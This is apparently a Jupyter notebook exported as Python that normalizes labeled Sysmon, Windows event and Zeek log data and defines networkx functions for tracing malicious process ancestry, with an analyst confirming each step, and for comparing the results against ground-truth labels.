#   TimeSourceRefId ReasonForRejection Active EdgeTraversal  EmbeddedContext  \
# 0             NaN                NaN    NaN           NaN              NaN
#
#   Flags LocalAddresses LocalOnlyMapped LooseSourceMapped ModifyingApplication  \
# 0   NaN            NaN             NaN               NaN                  NaN
#
#   ModifyingUser Origin Profiles RemoteAddresses RuleStatus SchemaVersion  \
# 0           NaN    NaN      NaN             NaN        NaN           NaN
#
#   SecurityOptions CountNew CountOld EnabledNew  UpdateReason NewTime  \
# 0             NaN      NaN      NaN        NaN           NaN     NaN
#
#    PreviousTime NotificationPackageName ShutdownActionType ShutdownEventCode  \
# 0           NaN                     NaN                NaN               NaN
#
#   ShutdownReason  BootMode BuildVersion MajorVersion  MinorVersion  \
# 0            NaN       NaN          NaN          NaN           NaN
#
#    QfeVersion ServiceVersion  StartTime  EnableDisableReason  VsmPolicy  \
# 0         NaN            NaN        NaN                  NaN        NaN
#
#    DCName ProcessingMode  ProcessingTimeInMilliseconds  SupportInfo1  \
# 0     NaN            NaN                           NaN           NaN
#
#   SupportInfo2  Group IdleImplementation  IdleStateCount  \
# 0          NaN    NaN                NaN             NaN
#
#    MaximumPerformancePercent MinimumPerformancePercent MinimumThrottlePercent  \
# 0                        NaN                       NaN                    NaN
#
#    NominalFrequency  Number PerformanceImplementation  StopTime  FileName  \
# 0               NaN     NaN                       NaN       NaN       NaN
#
#    LinkName  AdvancedOptions  ConfigAccessPolicy DisableIntegrityChecks  \
# 0       NaN              NaN                 NaN                    NaN
#
#    FlightSigning HypervisorDebug HypervisorLaunchType HypervisorLoadOptions  \
# 0            NaN             NaN                  NaN                   NaN
#
#    KernelDebug  RemoteEventLogging  TestSigning  VsmLaunchType  TSId  \
# 0          NaN                 NaN          NaN            NaN   NaN
#
#    BootStatusPolicy  LastBootGood  LastBootId  LastShutdownGood PuaCount  \
# 0               NaN           NaN         NaN               NaN      NaN
#
#    PuaPolicyId  BitlockerUserInputTime OldTime  Reason  State  SettingType  \
# 0          NaN                     NaN     NaN     NaN    NaN          NaN
#
#    SettingValue  SettingValueDisplay  SettingValueSize  VersionLen  TP_Binary  \
# 0           NaN                  NaN               NaN         NaN      False
#
#    @stream  @system  @proc  ts  uid id_orig_h id_orig_p id_resp_h id_resp_p  \
# 0      NaN      NaN    NaN NaN  NaN       NaN       NaN       NaN       NaN
#
#   proto service duration orig_bytes resp_bytes  conn_state missed_bytes  \
# 0   NaN     NaN      NaN        NaN        NaN         NaN          NaN
#
#   history orig_pkts orig_ip_bytes  resp_pkts  resp_ip_bytes orig_l2_addr  \
# 0     NaN       NaN           NaN        NaN            NaN          NaN
#
#    resp_l2_addr rtt  named_pipe endpoint  operation trans_id  query qclass  \
# 0           NaN NaN         NaN      NaN        NaN      NaN    NaN    NaN
#
#    qclass_name  qtype qtype_name  rcode  rcode_name  AA  TC  RD  RA   Z  \
# 0          NaN    NaN        NaN    NaN         NaN NaN NaN NaN NaN NaN
#
#   answers TTLs  rejected analyzer  failure_reason fuid tx_hosts  rx_hosts  \
# 0     NaN  NaN       NaN      NaN             NaN  NaN      NaN       NaN
#
#    conn_uids  source depth  analyzers mime_type  filename  is_orig  \
# 0        NaN     NaN   NaN        NaN       NaN       NaN      NaN
#
#    seen_bytes  total_bytes missing_bytes overflow_bytes  timedout  md5 sha1  \
# 0         NaN          NaN           NaN            NaN       NaN  NaN  NaN
#
#   request_type  client success  error_msg till  forwardable renewable  cipher  \
# 0          NaN     NaN     NaN        NaN  NaN          NaN       NaN     NaN
#
#   note  msg  sub  src  dst   p actions suppress_for  action path name size  \
# 0  NaN  NaN  NaN  NaN  NaN NaN     NaN          NaN     NaN  NaN  NaN  NaN
#
#   times_modified times_accessed times_created times_changed  share_type  \
# 0            NaN            NaN           NaN           NaN         NaN
#
#   version curve server_name  resumed  established  cert_chain_fuids  \
# 0     NaN   NaN         NaN      NaN          NaN               NaN
#
#    client_cert_chain_fuids  subject  issuer validation_status  \
# 0                      NaN      NaN     NaN               NaN
#
#   resp_certificate_sha1  ja3 ja3s  notice peer  addl   id  \
# 0                   NaN  NaN  NaN     NaN  NaN   NaN  NaN
#
#    certificate_version certificate_serial certificate_subject  \
# 0                  NaN                NaN                 NaN
#
#   certificate_issuer certificate_not_valid_before certificate_not_valid_after  \
# 0                NaN                          NaN                         NaN
#
#   certificate_key_alg  certificate_sig_alg certificate_key_type  \
# 0                 NaN                  NaN                  NaN
#
#    certificate_key_length certificate_exponent basic_constraints_ca extracted  \
# 0                     NaN                  NaN                  NaN       NaN
#
#    extracted_cutoff  trans_depth  method  uri  user_agent request_body_len  \
# 0               NaN          NaN     NaN  NaN         NaN              NaN
#
#   response_body_len status_code status_msg  resp_fuids  resp_mime_types  \
# 0               NaN         NaN        NaN         NaN              NaN
#
#   client_header_names orig_fuids orig_mime_types machine compile_ts   os  \
# 0                 NaN        NaN             NaN     NaN        NaN  NaN
#
#   subsystem is_exe  is_64bit uses_aslr  uses_dep uses_code_integrity  \
# 0       NaN    NaN       NaN       NaN       NaN                 NaN
#
#    uses_seh has_import_table has_export_table has_cert_table  has_debug_data  \
# 0       NaN              NaN              NaN            NaN             NaN
#
#    section_names
# 0            NaN
#
# [1 rows x 536 columns]

# %%
df_label.tail(1)
# Out:
#        @timestamp  @version Category Channel  EventID EventReceivedTime  \
# 200899        NaN       NaN      NaN     NaN      NaN               NaN
#
#        EventTime EventType  ExecutionProcessID Hostname IpAddress IpPort  \
# 200899       NaN       NaN                 NaN      NaN       NaN    NaN
#
#         Keywords LogonGuid Message Opcode  OpcodeValue ProviderGuid  \
# 200899       NaN       NaN     NaN    NaN          NaN          NaN
#
#         RecordNumber ServiceName ServiceSid Severity  SeverityValue  \
# 200899           NaN         NaN        NaN      NaN            NaN
#
#        SourceModuleName SourceModuleType SourceName Status TargetDomainName  \
# 200899              NaN              NaN        NaN    NaN              NaN
#
#        TargetUserName  Task  ThreadID TicketEncryptionType TicketOptions  \
# 200899            NaN   NaN       NaN                  NaN           NaN
#
#         TransmittedServices  Version host  port tags TP_Label Action  \
# 200899                  NaN      NaN  NaN   NaN  NaN      NaN    NaN
#
#        ActivityID CalloutKey CalloutName ChangeType Conditions  FilterId  \
# 200899        NaN        NaN         NaN        NaN        NaN       NaN
#
#        FilterKey FilterName FilterType  LayerId LayerKey LayerName ProcessId  \
# 200899       NaN        NaN        NaN      NaN      NaN       NaN       NaN
#
#        ProviderKey ProviderName UserName UserSid  Weight AccessList  \
# 200899         NaN          NaN      NaN     NaN     NaN        NaN
#
#        AccessMask AccessReason HandleId ObjectName ObjectServer ObjectType  \
# 200899        NaN          NaN      NaN        NaN          NaN        NaN
#
#        PrivilegeList ProcessName  ResourceAttributes  RestrictedSidCount  \
# 200899           NaN         NaN                 NaN                 NaN
#
#        SubjectDomainName SubjectLogonId SubjectUserName SubjectUserSid  \
# 200899               NaN            NaN             NaN            NaN
#
#        TransactionId ShareLocalPath ShareName RelativeTargetName CommandLine  \
# 200899           NaN            NaN       NaN                NaN         NaN
#
#        MandatoryLabel NewProcessId NewProcessName ParentProcessName  \
# 200899            NaN          NaN            NaN               NaN
#
#        TargetLogonId TargetUserSid TokenElevationType Service  \
# 200899           NaN           NaN                NaN     NaN
#
#        DisabledPrivilegeList EnabledPrivilegeList CallerProcessId  \
# 200899                   NaN                  NaN             NaN
#
#        CallerProcessName TargetSid AuthenticationPackageName ElevatedToken  \
# 200899               NaN       NaN                       NaN           NaN
#
#        ImpersonationLevel  KeyLength LmPackageName LogonProcessName  \
# 200899                NaN        NaN           NaN              NaN
#
#         LogonType RestrictedAdminMode TargetLinkedLogonId  \
# 200899        NaN                 NaN                 NaN
#
#         TargetOutboundDomainName  TargetOutboundUserName VirtualAccount  \
# 200899                       NaN                     NaN            NaN
#
#        WorkstationName SourceHandleId SourceProcessId TargetHandleId  \
# 200899             NaN            NaN             NaN            NaN
#
#        TargetProcessId AccountName AccountType ContextInfo Domain Payload  \
# 200899             NaN         NaN         NaN         NaN    NaN     NaN
#
#        UserID  NewThreadId RuleName SourceImage SourceProcessGuid  \
# 200899    NaN          NaN      NaN         NaN               NaN
#
#        StartAddress StartFunction StartModule TargetImage TargetProcessGuid  \
# 200899          NaN           NaN         NaN         NaN               NaN
#
#        UtcTime  MessageNumber  MessageTotal Path ScriptBlockId  \
# 200899     NaN            NaN           NaN  NaN           NaN
#
#        ScriptBlockText AlgorithmName KeyName KeyType Operation ReturnCode  \
# 200899             NaN           NaN     NaN     NaN       NaN        NaN
#
#        Archived Hashes Image IsExecutable ProcessGuid TargetFilename User  \
# 200899      NaN    NaN   NaN          NaN         NaN            NaN  NaN
#
#        CreationUtcTime Company Description FileVersion ImageLoaded  \
# 200899             NaN     NaN         NaN         NaN         NaN
#
#        OriginalFileName Product Signature SignatureStatus Signed  \
# 200899              NaN     NaN       NaN             NaN    NaN
#
#         DestinationHostname DestinationIp DestinationIsIpv6  DestinationPort  \
# 200899                  NaN           NaN               NaN              NaN
#
#         DestinationPortName Initiated Protocol  SourceHostname SourceIp  \
# 200899                  NaN       NaN      NaN             NaN      NaN
#
#        SourceIsIpv6  SourcePort  SourcePortName NewSd OldSd PipeName  \
# 200899          NaN         NaN             NaN   NaN   NaN      NaN
#
#        CurrentDirectory IntegrityLevel LogonId ParentCommandLine ParentImage  \
# 200899              NaN            NaN     NaN               NaN         NaN
#
#        ParentProcessGuid  ParentProcessId  TerminalSessionId CallTrace  \
# 200899               NaN              NaN                NaN       NaN
#
#        GrantedAccess SourceProcessGUID  SourceThreadId TargetProcessGUID  \
# 200899           NaN               NaN             NaN               NaN
#
#        Device TargetObject Details Application  FilterRTID  LayerRTID  \
# 200899    NaN          NaN     NaN         NaN         NaN        NaN
#
#        SourceAddress DestAddress  DestPort Direction RemoteMachineID  \
# 200899           NaN         NaN       NaN       NaN             NaN
#
#        RemoteUserID  BootMenuPolicy NewValue NewValueType ObjectValueName  \
# 200899          NaN             NaN      NaN          NaN             NaN
#
#        OldValue OldValueType OperationType ProfileUsed RuleId QueryName  \
# 200899      NaN          NaN           NaN         NaN    NaN       NaN
#
#        QueryResults  QueryStatus PreviousCreationUtcTime  EventCountTotal  \
# 200899          NaN          NaN                     NaN              NaN
#
#         EventIdx GroupMembership param1 Properties Hash  PreAuthType  \
# 200899       NaN             NaN    NaN        NaN  NaN          NaN
#
#         ClientProcessId  CountOfCredentialsReturned ProcessCreationTime  \
# 200899              NaN                         NaN                 NaN
#
#        ReadOperation TargetName  Type  CalloutId CalloutType  \
# 200899           NaN        NaN   NaN        NaN         NaN
#
#         CorruptionActionState DeviceName DriveName  Config  IsTestConfig  \
# 200899                    NaN        NaN       NaN     NaN           NaN
#
#         DirtyPages HiveName  HiveNameLength  KeysUpdated PackageName  \
# 200899         NaN      NaN             NaN          NaN         NaN
#
#        Workstation  DeviceNameLength DeviceTime  DeviceVersionMajor  \
# 200899         NaN               NaN        NaN                 NaN
#
#         DeviceVersionMinor FinalStatus UserData ServiceAccount  \
# 200899                 NaN         NaN      NaN            NaN
#
#        ServiceFileName  ServiceStartType ServiceType param10 param11 param2  \
# 200899             NaN               NaN         NaN     NaN     NaN    NaN
#
#        param3 param4 param5 param6 param7 param8 param9  ... TargetLogonGuid  \
# 200899    NaN    NaN    NaN    NaN    NaN    NaN    NaN  ...             NaN
#
#        TargetServerName ClientCreationTime TimeSource ImagePath StartType  \
# 200899              NaN                NaN        NaN       NaN       NaN
#
#        ProfileChanged BootType LoadOptions  EntryCount KeyFilePath  \
# 200899            NaN      NaN         NaN         NaN         NaN
#
#        ProviderContextKey ProviderContextName  ProviderContextType  DwordVal  \
# 200899                NaN                 NaN                  NaN       NaN
#
#        InterfaceGuid InterfaceName NewProfile OldProfile InstanceId  \
# 200899           NaN           NaN        NaN        NaN        NaN
#
#         MaxRunspaces MinRunspaces CurrentStratumNumber TimeSourceRefId  \
# 200899           NaN          NaN                  NaN             NaN
#
#        ReasonForRejection Active EdgeTraversal  EmbeddedContext Flags  \
# 200899                NaN    NaN           NaN              NaN   NaN
#
#        LocalAddresses LocalOnlyMapped LooseSourceMapped ModifyingApplication  \
# 200899            NaN             NaN               NaN                  NaN
#
#        ModifyingUser Origin Profiles RemoteAddresses RuleStatus SchemaVersion  \
# 200899           NaN    NaN      NaN             NaN        NaN           NaN
#
#        SecurityOptions CountNew CountOld EnabledNew  UpdateReason NewTime  \
# 200899             NaN      NaN      NaN        NaN           NaN     NaN
#
#         PreviousTime NotificationPackageName ShutdownActionType  \
# 200899           NaN                     NaN                NaN
#
#        ShutdownEventCode ShutdownReason  BootMode BuildVersion MajorVersion  \
# 200899               NaN            NaN       NaN          NaN          NaN
#
#         MinorVersion  QfeVersion ServiceVersion  StartTime  \
# 200899           NaN         NaN            NaN        NaN
#
#         EnableDisableReason  VsmPolicy  DCName ProcessingMode  \
# 200899                  NaN        NaN     NaN            NaN
#
#         ProcessingTimeInMilliseconds  SupportInfo1 SupportInfo2  Group  \
# 200899                           NaN           NaN          NaN    NaN
#
#        IdleImplementation  IdleStateCount  MaximumPerformancePercent  \
# 200899                NaN             NaN                        NaN
#
#        MinimumPerformancePercent MinimumThrottlePercent  NominalFrequency  \
# 200899                       NaN                    NaN               NaN
#
#         Number PerformanceImplementation  StopTime  FileName  LinkName  \
# 200899     NaN                       NaN       NaN       NaN       NaN
#
#         AdvancedOptions  ConfigAccessPolicy DisableIntegrityChecks  \
# 200899              NaN                 NaN                    NaN
#
#         FlightSigning HypervisorDebug HypervisorLaunchType  \
# 200899            NaN             NaN                  NaN
#
#        HypervisorLoadOptions  KernelDebug  RemoteEventLogging  TestSigning  \
# 200899                   NaN          NaN                 NaN          NaN
#
#         VsmLaunchType  TSId  BootStatusPolicy  LastBootGood  LastBootId  \
# 200899            NaN   NaN               NaN           NaN         NaN
#
#         LastShutdownGood PuaCount  PuaPolicyId  BitlockerUserInputTime  \
# 200899               NaN      NaN          NaN                     NaN
#
#        OldTime  Reason  State  SettingType  SettingValue  SettingValueDisplay  \
# 200899     NaN     NaN    NaN          NaN           NaN                  NaN
#
#         SettingValueSize  VersionLen  TP_Binary  @stream  \
# 200899               NaN         NaN        NaN     x509
#
#                                @system  @proc            ts  uid id_orig_h  \
# 200899  simplerockbuild.simplerock.lan   zeek  1.588206e+09  NaN       NaN
#
#        id_orig_p id_resp_h id_resp_p proto service duration orig_bytes  \
# 200899       NaN       NaN       NaN   NaN     NaN      NaN        NaN
#
#        resp_bytes  conn_state missed_bytes history orig_pkts orig_ip_bytes  \
# 200899        NaN         NaN          NaN     NaN       NaN           NaN
#
#         resp_pkts  resp_ip_bytes orig_l2_addr  resp_l2_addr rtt  named_pipe  \
# 200899        NaN            NaN          NaN           NaN NaN         NaN
#
#        endpoint  operation trans_id  query qclass  qclass_name  qtype  \
# 200899      NaN        NaN      NaN    NaN    NaN          NaN    NaN
#
#        qtype_name  rcode  rcode_name  AA  TC  RD  RA   Z answers TTLs  \
# 200899        NaN    NaN         NaN NaN NaN NaN NaN NaN     NaN  NaN
#
#         rejected analyzer  failure_reason fuid tx_hosts  rx_hosts  conn_uids  \
# 200899       NaN      NaN             NaN  NaN      NaN       NaN        NaN
#
#         source depth  analyzers mime_type  filename  is_orig  seen_bytes  \
# 200899     NaN   NaN        NaN       NaN       NaN      NaN         NaN
#
#         total_bytes missing_bytes overflow_bytes  timedout  md5 sha1  \
# 200899          NaN           NaN            NaN       NaN  NaN  NaN
#
#        request_type  client success  error_msg till  forwardable renewable  \
# 200899          NaN     NaN     NaN        NaN  NaN          NaN       NaN
#
#         cipher note  msg  sub  src  dst   p actions suppress_for  action path  \
# 200899     NaN  NaN  NaN  NaN  NaN  NaN NaN     NaN          NaN     NaN  NaN
#
#        name size times_modified times_accessed times_created times_changed  \
# 200899  NaN  NaN            NaN            NaN           NaN           NaN
#
#         share_type version curve server_name  resumed  established  \
# 200899         NaN     NaN   NaN         NaN      NaN          NaN
#
#         cert_chain_fuids  client_cert_chain_fuids  subject  issuer  \
# 200899               NaN                      NaN      NaN     NaN
#
#        validation_status resp_certificate_sha1  ja3 ja3s  notice peer  addl  \
# 200899               NaN                   NaN  NaN  NaN     NaN  NaN   NaN
#
#                         id  certificate_version certificate_serial  \
# 200899  FI7hkX38NiRfvFOz82                  3.0   06743FC495E54B7B
#
#                                                                             certificate_subject  \
# 200899  emailAddress=parse@conn.sons.info,CN=conn.sons.info,OU=parse,O=Conn and Sons,ST=SC,C=US
#
#                                                                              certificate_issuer  \
# 200899  emailAddress=parse@conn.sons.info,CN=conn.sons.info,OU=parse,O=Conn and Sons,ST=SC,C=US
#
#        certificate_not_valid_before certificate_not_valid_after  \
# 200899                 1.479837e+09                1.763661e+09
#
#        certificate_key_alg      certificate_sig_alg certificate_key_type  \
# 200899       rsaEncryption  sha256WithRSAEncryption                  rsa
#
#         certificate_key_length certificate_exponent basic_constraints_ca  \
# 200899                  2048.0              65537.0                  1.0
#
#        extracted  extracted_cutoff  trans_depth  method  uri  user_agent  \
# 200899       NaN               NaN          NaN     NaN  NaN         NaN
#
#        request_body_len response_body_len status_code status_msg  resp_fuids  \
# 200899              NaN               NaN         NaN        NaN         NaN
#
#         resp_mime_types client_header_names orig_fuids orig_mime_types  \
# 200899              NaN                 NaN        NaN             NaN
#
#        machine compile_ts   os subsystem is_exe  is_64bit uses_aslr  uses_dep  \
# 200899     NaN        NaN  NaN       NaN    NaN       NaN       NaN       NaN
#
#        uses_code_integrity  uses_seh has_import_table has_export_table  \
# 200899                 NaN       NaN              NaN              NaN
#
#        has_cert_table  has_debug_data  section_names
# 200899            NaN             NaN            NaN
#
# [1 rows x 536 columns]

# %% [markdown]
# ## Normalize Timestamp, IP/Port Columns
# ------------------

# %%
df_label['time_stamp'] = df_label['@timestamp'].apply(lambda x: (pd.Timestamp(x)))

# %%
df_label['time_stamp'] = df_label['time_stamp'].fillna(df_label['ts'].apply(lambda x: (pd.to_datetime(x, unit='s', utc=True))))

# %%
# Transform Host Data - Similar Data to Single Columns
df_label['Destination_IP'] = df_label['DestinationIp']
df_label['Destination_IP'] = df_label['Destination_IP'].fillna(df_label['DestAddress'])
df_label['Source_IP'] = df_label['IpAddress']
df_label['Source_IP'] = df_label['Source_IP'].fillna(df_label['SourceIp'])
df_label['Source_IP'] = df_label['Source_IP'].fillna(df_label['SourceAddress'])
df_label['Source_Port'] = df_label['IpPort']
df_label['Source_Port'] = df_label['Source_Port'].fillna(df_label['SourcePort'])
df_label['Destination_Port'] = df_label['DestinationPort']
df_label['Destination_Port'] = df_label['Destination_Port'].fillna(df_label['DestPort'])

# %%
# Transform Network Data - Similar Data to Single Columns
df_label['Source_IP'] = df_label['Source_IP'].fillna(df_label['id_orig_h'])
df_label['Source_Port'] = df_label['Source_Port'].fillna(df_label['id_orig_p'])
df_label['Destination_IP'] = df_label['Destination_IP'].fillna(df_label['id_resp_h'])
df_label['Destination_Port'] = df_label['Destination_Port'].fillna(df_label['id_resp_p'])

# %% [markdown]
# ## Beagle Column Formatting

# %%
# Sysmon Transformer
df_label['EventData_ParentImage'] = df_label['ParentImage'].astype(object)
df_label['EventData_ParentProcessId'] = df_label['ParentProcessId']
df_label['EventData_ParentProcessGuid'] = df_label['ParentProcessGuid']
df_label['EventData_Image'] = df_label['Image'].astype(object)
df_label['EventData_CommandLine'] = df_label['CommandLine'].astype(object)
df_label['EventData_Hashes'] = df_label['Hashes'].astype(object)

df_label['Computer'] = df_label['Hostname'].astype(object)
df_label['EventData_User'] = df_label['User'].astype(object)
df_label['EventData_UtcTime'] = df_label['UtcTime']

df_label['EventData_ProcessGuid'] = df_label['ProcessGuid']
df_label['EventData_ProcessId'] = df_label['ProcessId']

df_label['EventData_DestinationIp'] = df_label['DestinationIp']
df_label['EventData_DestinationPort'] = df_label['DestinationPort']
df_label['EventData_Protocol'] = df_label['Protocol']
df_label['EventData_TargetFilename'] = df_label['TargetFilename']

df_label['EventData_TargetObject'] = df_label['TargetObject']
df_label['EventData_EventType'] = df_label['EventType']
#df_label['EventData_Details'] = df_label['ProcessId']

# %%
# EVTX Transformer
#event_id = int(event["eventid_qualifiers"])
df_label['eventid_qualifiers'] = df_label['EventID']

#parent_pid = int(event["data_name_processid"], 16)
df_label['data_name_processid'] = df_label['ProcessId']

#child_pid = int(event["data_name_newprocessid"], 16)
df_label['data_name_newprocessid'] = df_label['NewProcessId']

#proc_name, proc_path = split_path(event["data_name_newprocessname"])
df_label['data_name_newprocessname'] = df_label['NewProcessName']

#child = Process(
#    host=event["computer"],
df_label['computer'] = df_label['Hostname'].astype(object)
#    process_id=child_pid,
#    user=event["data_name_subjectusername"],
df_label['data_name_subjectusername'] = df_label['SubjectUserName']

#    process_image=proc_name,
#    process_image_path=proc_path,
#    command_line=event.get("data_name_commandline"),
df_label['data_name_commandline'] = df_label['CommandLine']
#)
#parent.launched[child].append(timestamp=event["timecreated_systemtime"])
df_label['timecreated_systemtime'] = df_label['EventTime']

# %% [markdown]
# ## Manual Recurse Ancestor Chain Functions

# %%
def eval_ancestor_chain(G, starting_guid):
    for (p, d) in G.nodes(data=True):
        if 'process_guid' in d['properties'].keys():
            if starting_guid in d['properties']['process_guid']:
                selected_node = p
                
    #ancestors = nx.ancestors(G, selected_node)
    malicious_ancestors = [selected_node]
    for i in nx.ancestors(G, selected_node):
        if(G.node[i]['_node_type'] == 'Process'):
            print("==========================================")
            print("Node Data:")
            print("==========================================")
            print(G.node[i])
            print("==========================================")
            answer = None
            while answer not in ("yes", "no"):
                answer = input("Malicious? Enter yes or no: ")
                if answer == "yes":
                    # Do this.
                    malicious_ancestors.append(i)
                elif answer == "no":
                    # Do that.
                    return malicious_ancestors
                else:
                    print("Please enter yes or no.")
    return malicious_ancestors

def determine_malicious_root_proc(G, starting_guid):
    malicious_ancestors = eval_ancestor_chain(G, starting_guid)
    print("")
    print("##########################################")
    print("Confirm this as the senior malicious node?")
    print("##########################################")
    print("Node Data:")
    print("==========================================")
    print(G.node[malicious_ancestors[-1]])
    print("==========================================")
    print("Edge Out Data:")
    print("==========================================")
    for i in G.out_edges(malicious_ancestors[-1], data=True):
        if i[2]['type'] == 'Launched':
            print(i[2]['type'])
            print(G.node[i[1]])
            print("==========================================")
    answer = None
    while answer not in ("yes", "no"):
        answer = input("Malicious? Enter yes or no: ")
        if answer == "yes":
            # Do this.
            return malicious_ancestors[-1]
        elif answer == "no":
            # Do that.
            print("Re-run the eval_ancestor chain")
            malicious_root_ancestor = determine_malicious_root_proc(G, starting_guid)
            return malicious_root_ancestor
        else:
            print("Please enter yes or no.")
            
def get_ancestor_descendant_graph(G, malicious_root_ancestor):
    print(malicious_root_ancestor)

    descendants = nx.descendants(G, malicious_root_ancestor) #Returns all nodes reachable from source in G.
    print(len(descendants))

    ancestors = nx.ancestors(G, malicious_root_ancestor)
    print(len(ancestors))

    suspected_malicious = list(ancestors) + list(descendants)
    suspected_malicious.append(malicious_root_ancestor)
    print(len(suspected_malicious))

    H = G.subgraph(suspected_malicious)
    return H, malicious_root_ancestor, ancestors, descendants

def print_ancestor_descendant_graph(H, malicious_root_ancestor, ancestors, descendants):
    from matplotlib.pyplot import figure
    # Why are there orphaned nodes? I forgot to add the OG node. Fixed.
    # https://networkx.github.io/documentation/networkx-1.9/examples/drawing/labels_and_colors.html
    #fig = plt.Figure()
    figure(figsize=(15, 12))
    pos=nx.kamada_kawai_layout(H) # positions for all nodes

    # nodes
    nx.draw_networkx_nodes(H,pos,
                       nodelist=list(ancestors),
                       node_color='r',
                       #node_size=500,
                       label='ancestors',
                   alpha=0.8)
    nx.draw_networkx_nodes(H,pos,
                       nodelist=list(descendants),
                       node_color='b',
                       #node_size=500,
                       label='descendants',
                   alpha=0.8)
    nx.draw_networkx_nodes(H,pos,
                       nodelist=[malicious_root_ancestor],
                       node_color='g',
                       #node_size=500,
                       label='starting-point',
                   alpha=0.8)

    # edges
    nx.draw_networkx_edges(H,pos,width=1.0,alpha=0.5)

    #plt.legend()
    plt.legend(loc='upper left')
    #fig.update_layout(legend=dict(x=-.1, y=1.2))
    plt.axis('off')
    print("Saving as: ancestor_descendants_" + str(malicious_root_ancestor) + ".png")
    plt.savefig("ancestor_descendants_" + str(malicious_root_ancestor) + ".png") # save as png
    plt.show() # display
    
def get_ancestor_descendant_types(H):
    file_nodes = []
    for (p, d) in H.nodes(data=True):
        if d['_node_type']=='File':
            file_nodes.append(p)
    len(file_nodes)

    proc_nodes = []
    for (p, d) in H.nodes(data=True):
        if d['_node_type']=='Process':
            proc_nodes.append(p)
    len(proc_nodes)

    ip_nodes = []
    for (p, d) in H.nodes(data=True):
        if d['_node_type']=='IP Address':
            ip_nodes.append(p)
    len(ip_nodes)
    
    return file_nodes, proc_nodes, ip_nodes

def print_ancestor_descendant_type_graph(H, malicious_root_ancestor, file_nodes, proc_nodes, ip_nodes):
    # Why are there orphaned nodes? I forgot to add the OG node. Fixed.
    # https://networkx.github.io/documentation/networkx-1.9/examples/drawing/labels_and_colors.html
    #fig = plt.Figure()
    figure(figsize=(15, 12))
    pos=nx.kamada_kawai_layout(H) # positions for all nodes

    # nodes
    nx.draw_networkx_nodes(H,pos,
                           nodelist=file_nodes,
                           node_color='r',
                           #node_size=500,
                           label='file_nodes',
                       alpha=0.8)
    nx.draw_networkx_nodes(H,pos,
                           nodelist=proc_nodes,
                           node_color='b',
                           #node_size=500,
                           label='proc_nodes',
                       alpha=0.8)
    nx.draw_networkx_nodes(H,pos,
                           nodelist=ip_nodes,
                           node_color='g',
                           #node_size=500,
                           label='ip_nodes',
                       alpha=0.8)

    # edges
    nx.draw_networkx_edges(H,pos,width=1.0,alpha=0.5)

    #plt.legend()
    plt.legend(loc='upper left')
    #fig.update_layout(legend=dict(x=-.1, y=1.2))
    plt.axis('off')
    print("Saving as: ancestor_descendants_nodeType_" + str(malicious_root_ancestor) + ".png")
    plt.savefig("ancestor_descendants_nodeType_" + str(malicious_root_ancestor) + ".png") # save as png
    plt.show() # display
    
def analyze_graph_vs_label_proc(H, proc_nodes):
    graph_bad_guids = []
    for i in proc_nodes:
        graph_bad_guids.append(H.node[i]['properties']['process_guid'])
    print(len(graph_bad_guids))
    #print(graph_bad_guids)
    
    label_bad_guids = df_label.loc[(df_label['TP_Binary'] == True) & (df_label.ProcessGuid.notnull())]['ProcessGuid'].unique()
    pd_all_guids = df_label.loc[(df_label.ProcessGuid.notnull()) & (df_label.CommandLine.notnull())][['ProcessGuid', 'Hostname', 'TP_Binary', 'CommandLine']]
    pd_all_guids['orig_label'] = False
    pd_all_guids['orig_label'].loc[pd_all_guids.ProcessGuid.isin(label_bad_guids)] = True

    pd_all_guids = pd_all_guids.drop(columns=['TP_Binary']).drop_duplicates()
    pd_all_guids['graph_label'] = False
    pd_all_guids['graph_label'].loc[pd_all_guids.ProcessGuid.isin(graph_bad_guids)] = True

    with pd.option_context('display.max_rows', None, 'display.max_columns', None, 'display.max_colwidth', None):
        display(pd_all_guids[['ProcessGuid', 'Hostname', 'orig_label', 'graph_label', 'CommandLine']].loc[((pd_all_guids.orig_label==True) | (pd_all_guids.graph_label==True))].sort_values(by=['orig_label', 'graph_label'], ascending=False))
        
def manual_recurse_pipeline(G, starting_point):
    malicious_root_ancestor = determine_malicious_root_proc(G, starting_point)
    print(malicious_root_ancestor)
    
    H, malicious_root_ancestor, ancestors, descendants = get_ancestor_descendant_graph(G, malicious_root_ancestor)
    
    print_ancestor_descendant_graph(H, malicious_root_ancestor, ancestors, descendants)
    
    file_nodes, proc_nodes, ip_nodes = get_ancestor_descendant_types(H)
    
    print_ancestor_descendant_type_graph(H, malicious_root_ancestor, file_nodes, proc_nodes, ip_nodes)
    
    analyze_graph_vs_label_proc(H, proc_nodes)
    
    return H, malicious_root_ancestor, ancestors, descendants, file_nodes, proc_nodes, ip_nodes

# %% [markdown]
# ## Cluster Manual Recurse Functions

# %%
def new_eval_ancestor_chain(G, starting_guid):
    for (p, d) in G.nodes(data=True):
        if 'process_guid' in d['properties'].keys():
            if starting_guid in d['properties']['process_guid']:
                selected_node = p
                
    #ancestors = nx.ancestors(G, selected_node)
    malicious_ancestors = [selected_node]
    print("##########################################")
    print("Conduct Ancestor Chain Evaluation")
    print("##########################################")
    print("")
    for i in list([selected_node] + list(nx.ancestors(G, selected_node))):
        if(G.node[i]['_node_type'] == 'Process'):
            print("==========================================")
            print("Node " + str(i) + " Data:")
            print("==========================================")
            print(G.node[i])
            print("==========================================")
            H, malicious_root_ancestor, ancestors, descendants = get_ancestor_descendant_graph(G, i)
            df = get_graph_dataframe(G)
            
            print("==========================================")
            print("Node " + str(i) + " Ancestor/Descendant Chain:")
            print("==========================================")
            current_node_eval(df, malicious_root_ancestor, ancestors, descendants)
            
            print("==========================================")
            print("Node " + str(i) + " Community Analysis:")
            print("==========================================")
            clusterings = ['Greedy_Mod', 'BestPartition', 'label_prop']
            for j in clusterings:
                print(j)
                get_community_analysis(df, j)
            
            answer = None
            while answer not in ("yes", "no"):
                answer = input("Malicious? Enter yes or no: ")
                if answer == "yes":
                    # Do this.
                    malicious_ancestors.append(i)
                elif answer == "no":
                    # Do that.
                    return malicious_ancestors
                else:
                    print("Please enter yes or no.")
    return malicious_ancestors

def get_ancestor_descendant_graph(G, malicious_root_ancestor):
    print(malicious_root_ancestor)

    descendants = nx.descendants(G, malicious_root_ancestor) #Returns all nodes reachable from source in G.
    print(len(descendants))

    ancestors = nx.ancestors(G, malicious_root_ancestor)
    print(len(ancestors))

    suspected_malicious = list(ancestors) + list(descendants)
    suspected_malicious.append(malicious_root_ancestor)
    print(len(suspected_malicious))

    H = G.subgraph(suspected_malicious)
    return H, malicious_root_ancestor, ancestors, descendants

def get_graph_dataframe(G):
    df = pd.DataFrame.from_dict(dict(G.nodes(data=True)), orient='index')
